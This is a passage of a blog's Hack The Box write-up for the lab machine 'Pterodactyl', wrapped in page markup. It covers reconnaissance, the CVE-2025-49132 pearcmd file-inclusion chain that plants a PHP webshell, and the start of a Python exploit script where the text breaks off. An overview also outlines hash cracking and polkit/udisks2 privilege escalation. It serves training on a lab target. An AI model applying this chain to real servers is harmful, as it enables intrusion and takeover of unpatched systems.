@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/05/17/hackthebox-pterodactyl/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewPterodactyl is a hard-difficulty Linux machine from Hack The Box dealing initially with a vulnerable Pterodactyl Panel v1.11.10 instance that we exploit through CVE-2025-49132, a PEAR pearcmd">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Pterodactyl">
+<meta property="og:url" content="http://fouedsaidi.com/2026/05/17/Hackthebox-Pterodactyl/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewPterodactyl is a hard-difficulty Linux machine from Hack The Box dealing initially with a vulnerable Pterodactyl Panel v1.11.10 instance that we exploit through CVE-2025-49132, a PEAR pearcmd">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Pterodactyl/Pterodactyl.png">
+<meta property="article:published_time" content="2026-05-17T18:07:41.000Z">
+<meta property="article:modified_time" content="2026-05-17T19:42:12.313Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Pterodactyl/Pterodactyl.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Pterodactyl -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Pterodactyl</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-05-17 21:07:41</span>
+        <span class="mobile">2026-05-17 21:07:41</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-05-17 22:42:12</span>
+            <span class="mobile">2026-05-17 22:42:12</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Pterodactyl is a hard-difficulty Linux machine from Hack The Box dealing initially with a vulnerable Pterodactyl Panel v1.11.10 instance that we exploit through CVE-2025-49132, a PEAR <code>pearcmd</code> Local File Inclusion to Remote Code Execution chain, giving us a foothold as the low-privileged <code>wwwrun</code> user. From there, we dump the panel’s MariaDB database to recover a bcrypt hash for the <code>phileasfogg3</code> user which we then crack with John and rockyou to pivot to SSH. For privilege escalation we chain two fresh CVEs: CVE-2025-6018 (polkit <code>pam_env</code> bypass via <code>~/.pam_environment</code>) to gain <code>allow_active</code> privileges, and CVE-2025-6019 (udisks2 XFS loop-setup race condition) to expose a SUID <code>bash</code> from a crafted XFS image we upload, finally winning the race and dropping into a root shell.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Pterodactyl/Pterodactyl.png"
+                      alt="Pterodactyl"
+                ><figcaption>Pterodactyl</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE  SERVICE    VERSION</span><br><span class="line">22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 (ECDSA)</span><br><span class="line">|_  256 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc (ED25519)</span><br><span class="line">80/tcp   open   http       nginx 1.21.5</span><br><span class="line">|_http-server-header: nginx/1.21.5</span><br><span class="line">|_http-title: Did not follow redirect to http://pterodactyl.htb/</span><br><span class="line">443/tcp  closed https</span><br><span class="line">8080/tcp closed http-proxy</span><br><span class="line">Aggressive OS guesses: Linux 5.0 - 5.14 (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), OpenWrt 22.03 (Linux 5.10) (92%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (92%), Linux 3.10 - 4.11 (91%), Linux 5.0 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We have our usual ssh on 22 and an nginx 1.21.5 web application on port 80 that redirects us to <code>pterodactyl.htb</code>, which we add to our <code>/etc/hosts</code> file.</p>
+<h2 id="Web-Application-http-pterodactyl-htb"><a href="#Web-Application-http-pterodactyl-htb" class="headerlink" title="Web Application - http://pterodactyl.htb/"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://pterodactyl.htb/" >http://pterodactyl.htb/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><p>Browsing to the application, we land on a MonitorLand-styled landing page. PHP is running as version <code>8.4.8</code>. A quick look at the changelog gives us some valuable enumeration data:</p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://pterodactyl.htb/changelog.txt" >http://pterodactyl.htb/changelog.txt <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">MonitorLand - CHANGELOG.txt</span><br><span class="line">======================================</span><br><span class="line"></span><br><span class="line">Version 1.20.X</span><br><span class="line"></span><br><span class="line">[Added] Main Website Deployment</span><br><span class="line">--------------------------------</span><br><span class="line">- Deployed the primary landing site for MonitorLand.</span><br><span class="line">- Implemented homepage, and link for Minecraft server.</span><br><span class="line">- Integrated site styling and dark-mode as primary.</span><br><span class="line"></span><br><span class="line">[Linked] Subdomain Configuration</span><br><span class="line">--------------------------------</span><br><span class="line">- Added DNS and reverse proxy routing for play.pterodactyl.htb.</span><br><span class="line">- Configured NGINX virtual host for subdomain forwarding.</span><br><span class="line"></span><br><span class="line">[Installed] Pterodactyl Panel v1.11.10</span><br><span class="line">--------------------------------------</span><br><span class="line">- Installed Pterodactyl Panel.</span><br><span class="line">- Configured environment:</span><br><span class="line">  - PHP with required extensions.</span><br><span class="line">  - MariaDB 11.8.3 backend.</span><br><span class="line"></span><br><span class="line">[Enhanced] PHP Capabilities</span><br><span class="line">-------------------------------------</span><br><span class="line">- Enabled PHP-FPM for smoother website handling on all domains.</span><br><span class="line">- Enabled PHP-PEAR for PHP package management.</span><br><span class="line">- Added temporary PHP debugging via phpinfo()</span><br></pre></td></tr></table></figure></div>
+
+<p>So we have:</p>
+<ul>
+<li>A <code>play.pterodactyl.htb</code> subdomain routed via nginx (which we add to our <code>/etc/hosts</code> as well, and the panel actually sits on <code>panel.pterodactyl.htb</code>).</li>
+<li><strong>Pterodactyl Panel v1.11.10</strong> running on the panel subdomain backed by MariaDB 11.8.3.</li>
+<li>PHP-PEAR is enabled (yes, this is the gift we needed).</li>
+<li>A <code>phpinfo()</code> page exposed at <a class="link"   target="_blank" rel="noopener" href="http://pterodactyl.htb/phpinfo.php" >http://pterodactyl.htb/phpinfo.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</li>
+</ul>
+<h3 id="CVE-2025-49132-Pterodactyl-Panel-pearcmd-LFI-to-RCE"><a href="#CVE-2025-49132-Pterodactyl-Panel-pearcmd-LFI-to-RCE" class="headerlink" title="CVE-2025-49132 - Pterodactyl Panel pearcmd LFI to RCE"></a>CVE-2025-49132 - Pterodactyl Panel pearcmd LFI to RCE</h3><p>A quick lookup gives us <a class="link"   target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2025-49132" >CVE-2025-49132 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and the matching public PoC over at <a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/52341" >exploit-db <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. The bug lives in the <code>locales/locale.json</code> endpoint, which loads files based on attacker-controlled <code>locale</code> and <code>namespace</code> parameters. Because PEAR’s <code>pearcmd.php</code> is available on disk and the parameters aren’t sanitized, we can chain two requests:</p>
+<ol>
+<li>First we use <code>pearcmd config-create</code> as an LFI write primitive to drop a PHP webshell into <code>/tmp/shell.php</code>.</li>
+<li>Then we include the dropped file via <code>locale=../../../../../tmp&amp;namespace=shell</code> to execute it.</li>
+</ol>
+<p>I cleaned up the public PoC into an interactive exploit script:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">CVE-2025-49132 PEAR Exploit - Improved Version</span><br><span class="line">Based on working exploit with enhanced output parsing and features</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import subprocess</span><br><span class="line">import re</span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line">class Colors:</span><br><span class="line">    BLUE = &#x27;\033[94m&#x27;</span><br><span class="line">    GREEN = &#x27;\033[92m&#x27;</span><br><span class="line">    YELLOW = &#x27;\033[93m&#x27;</span><br><span class="line">    RED = &#x27;\033[91m&#x27;</span><br><span class="line">    END = &#x27;\033[0m&#x27;</span><br><span class="line">    BOLD = &#x27;\033[1m&#x27;</span><br><span class="line"></span><br><span class="line">def print_info(msg):</span><br><span class="line">    print(f&quot;&#123;Colors.BLUE&#125;[*]&#123;Colors.END&#125; &#123;msg&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def print_success(msg):</span><br><span class="line">    print(f&quot;&#123;Colors.GREEN&#125;[+]&#123;Colors.END&#125; &#123;msg&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def print_error(msg):</span><br><span class="line">    print(f&quot;&#123;Colors.RED&#125;[-]&#123;Colors.END&#125; &#123;msg&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def clean_output(raw_output):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Clean PEAR config output to extract actual command results</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if not raw_output:</span><br><span class="line">        return None</span><br><span class="line">    </span><br><span class="line">    lines = raw_output.split(&#x27;\n&#x27;)</span><br><span class="line">    results = []</span><br><span class="line">    </span><br><span class="line">    for line in lines:</span><br><span class="line">        # Skip empty lines</span><br><span class="line">        if not line.strip():</span><br><span class="line">            continue</span><br><span class="line">            </span><br><span class="line">        # Look for command output patterns</span><br><span class="line">        if any(pattern in line for pattern in [&#x27;uid=&#x27;, &#x27;HTB&#123;&#x27;, &#x27;root:&#x27;, &#x27;www-data&#x27;, &#x27;bin/&#x27;, &#x27;total &#x27;]):</span><br><span class="line">            # Clean up ANSI codes and PEAR artifacts</span><br><span class="line">            clean = re.sub(r&#x27;\x1b\[[0-9;]*m&#x27;, &#x27;&#x27;, line)  # Remove ANSI codes</span><br><span class="line">            clean = re.sub(r&#x27;.*?(uid=\d+.*?)\s+uid=.*&#x27;, r&#x27;\1&#x27;, clean)  # Remove duplicates</span><br><span class="line">            clean = clean.strip()</span><br><span class="line">            </span><br><span class="line">            if clean and clean not in results:</span><br><span class="line">                results.append(clean)</span><br><span 